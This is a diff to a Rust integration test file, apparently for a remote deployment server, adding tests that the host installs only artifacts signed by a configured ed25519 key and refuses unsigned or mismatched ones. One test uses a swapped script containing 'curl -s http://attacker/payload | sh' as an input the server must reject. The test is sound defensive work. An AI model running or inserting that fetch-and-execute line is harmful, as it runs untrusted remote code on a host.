@@ -134,6 +134,30 @@ impl ServerProcess {
         );
     }
 
+    /// Wait for a line the server prints as it starts.
+    ///
+    /// `start` returns as soon as the process exists, so reading the log without
+    /// waiting here races the child's first write and fails at random.
+    async fn banner(&mut self, needle: &str) -> String {
+        for _ in 0..400 {
+            let text = std::fs::read_to_string(&self.log).unwrap_or_default();
+            if text.contains(needle) {
+                return text;
+            }
+            if let Some(status) = self.child.try_wait().expect("wait") {
+                panic!(
+                    "the server exited with {status} before saying {needle:?}; it \
+                     said {text:?}"
+                );
+            }
+            tokio::time::sleep(Duration::from_millis(25)).await;
+        }
+        panic!(
+            "the server never said {needle:?}; it said {:?}",
+            std::fs::read_to_string(&self.log).unwrap_or_default()
+        );
+    }
+
     async fn connect_unix(&mut self, socket: &Path) -> RemoteWorkspace<tokio::net::UnixStream> {
         let tokens = self.tokens().await;
         let mut last = None;
@@ -600,13 +624,17 @@ async fn an_escaping_path_is_refused_by_the_running_server() {
 async fn a_build_can_be_deployed_through_the_running_server() {
     let dir = short_socket_dir("d");
     let socket = dir.join("s.sock");
-    let mut server = ServerProcess::start(Some(&socket), None, &[]).await;
+    // An unsigned deploy is what `--allow-unsigned-artifact` exists for, and this
+    // test is about the deployment machinery rather than who signed what, so this
+    // host was started with that hatch. The signature rules get their own test.
+    let mut server =
+        ServerProcess::start(Some(&socket), None, &["--allow-unsigned-artifact"]).await;
     let mut session = server.connect_unix(&socket).await;
 
     // The artifact is this very binary: that is what `ARTIFACT_NAME` means.
     let artifact = std::fs::read(env!("CARGO_BIN_EXE_chaos-remote-server")).expect("binary");
     let outcome = session
-        .install_artifact("1.2.3", &artifact)
+        .install_artifact("1.2.3", &artifact, None)
         .await
         .expect("deploy the build we are running");
     assert!(outcome.current);
@@ -638,6 +666,156 @@ async fn a_build_can_be_deployed_through_the_running_server() {
     let _ = group.kill();
     let text = String::from_utf8_lossy(&output.stdout).into_owned();
     assert!(text.starts_with("chaos-remote-server "), "{text}");
+
+    server.stop().await;
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// A signing key plus its base64 public half, for the tests standing in for a
+/// release publisher. The verification side of this pair lives in
+/// `xai-grok-signature`; signing here is only ever a test's way of producing a
+/// believable sidecar.
+fn signing_keypair(seed: u8) -> (ed25519_dalek::SigningKey, String) {
+    use base64::Engine as _;
+    let signing = ed25519_dalek::SigningKey::from_bytes(&[seed; 32]);
+    let public = base64::engine::general_purpose::STANDARD.encode(signing.verifying_key());
+    (signing, public)
+}
+
+fn signature_for(signing: &ed25519_dalek::SigningKey, bytes: &[u8]) -> String {
+    use base64::Engine as _;
+    use ed25519_dalek::Signer as _;
+    base64::engine::general_purpose::STANDARD.encode(signing.sign(bytes).to_bytes())
+}
+
+/// A host started with `--trust-signing-key` installs exactly one kind of artifact:
+/// the one that key signed. Everything is the shipped path — the flag, the policy it
+/// produces, the field on the wire, the host's refusal, and the version that stays
+/// current when a refusal happens.
+#[tokio::test]
+#[cfg(unix)]
+async fn a_host_with_a_trusted_key_installs_only_what_that_key_signed() {
+    use chaos_engine::remote::RemoteError;
+
+    let dir = short_socket_dir("sig");
+    let socket = dir.join("s.sock");
+    let (publisher, publisher_key) = signing_keypair(31);
+    let (other_publisher, _) = signing_keypair(32);
+    let mut server = ServerProcess::start(
+        Some(&socket),
+        None,
+        &["--trust-signing-key", &publisher_key],
+    )
+    .await;
+    // An operator reading the startup output can see what this host will accept —
+    // the alternative is deducing it from a failed deploy.
+    let banner = server.banner("artifacts: a signature from").await;
+    assert!(
+        banner.contains("is required"),
+        "the line should say the signature is mandatory, not only name a key: {banner}"
+    );
+    let mut session = server.connect_unix(&socket).await;
+
+    let published: Vec<u8> = b"#!/bin/sh\nexec chaos-remote-server --version\n".to_vec();
+    let outcome = session
+        .install_artifact(
+            "1.0.0",
+            &published,
+            Some(&signature_for(&publisher, &published)),
+        )
+        .await
+        .expect("the release build, signed by the release key, installs");
+    assert!(outcome.current);
+
+    // No signature at all.
+    let err = session
+        .install_artifact("2.0.0", b"#!/bin/sh\necho from a leak\n", None)
+        .await
+        .expect_err("this host does not install unsigned builds");
+    let RemoteError::Install { reason, .. } = err else {
+        panic!("an install refusal, not {err:?}");
+    };
+    assert!(reason.contains("signature_missing"), "{reason}");
+
+    // Signed, but not by anybody this host trusts.
+    let other = b"#!/bin/sh\necho from another publisher\n";
+    let err = session
+        .install_artifact(
+            "3.0.0",
+            other,
+            Some(&signature_for(&other_publisher, other)),
+        )
+        .await
+        .expect_err("a signature from a key this host was not told about");
+    let RemoteError::Install { reason, .. } = err else {
+        panic!("an install refusal, not {err:?}");
+    };
+    assert!(reason.contains("signature_invalid"), "{reason}");
+
+    // The interesting one: the bytes are swapped and the sha256 is recomputed over
+    // the swap, which the client computes itself, so integrity passes and only
+    // provenance objects.
+    let swapped: Vec<u8> = b"#!/bin/sh\ncurl -s http://attacker/payload | sh\n".to_vec();
+    let err = session
+        .install_artifact(
+            "4.0.0",
+            &swapped,
+            Some(&signature_for(&publisher, &published)),
+        )
+        .await
+        .expect_err("the good signature does not cover these bytes");
+    let RemoteError::Install { reason, .. } = err else {
+        panic!("an install refusal, not {err:?}");
+    };
+    assert!(reason.contains("signature_invalid"), "{reason}");
+
+    let layout = chaos_engine::remote::InstallLayout::new(&server.workspace);
+    assert_eq!(
+        layout.current_version().as_deref(),
+        Some("1.0.0"),
+        "three refusals later, the host is still on the build it trusted"
+    );
+    assert_eq!(
+        std::fs::read(layout.current_artifact().expect("current")).unwrap(),
+        published
+    );
+    assert_eq!(
+        layout.installed_versions(),
+        vec!["1.0.0".to_string()],
+        "a refused artifact gets no permanent directory"
+    );
+
+    server.stop().await;
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// A host with no key configured still refuses; the refusal is the point, not a
+/// warning. `--allow-unsigned-artifact` is the only way it installs anything, and
+/// the startup line says which of the two states the host is in.
+#[tokio::test]
+#[cfg(unix)]
+async fn a_host_without_a_key_refuses_an_unsigned_deploy() {
+    use chaos_engine::remote::RemoteError;
+
+    let dir = short_socket_dir("nosig");
+    let socket = dir.join("s.sock");
+    let mut server = ServerProcess::start(Some(&socket), None, &[]).await;
+    let banner = server.banner("artifacts:").await;
+    assert!(
+        banner.contains("no key is configured"),
+        "a host that can check nothing should say so at startup: {banner}"
+    );
+    let mut session = server.connect_unix(&socket).await;
+    let err = session
+        .install_artifact("1.0.0", b"#!/bin/sh\n", None)
+        .await
+        .expect_err("the default is to require a signature");
+    let RemoteError::Install { reason, .. } = err else {
+        panic!("an install refusal, not {err:?}");
+    };
+    assert!(reason.contains("signature_missing"), "{reason}");
+    let layout = chaos_engine::remote::InstallLayout::new(&server.workspace);
+    assert_eq!(layout.current_version(), None);
 
     server.stop().await;
     let _ = std::fs::remove_dir_all(&dir);
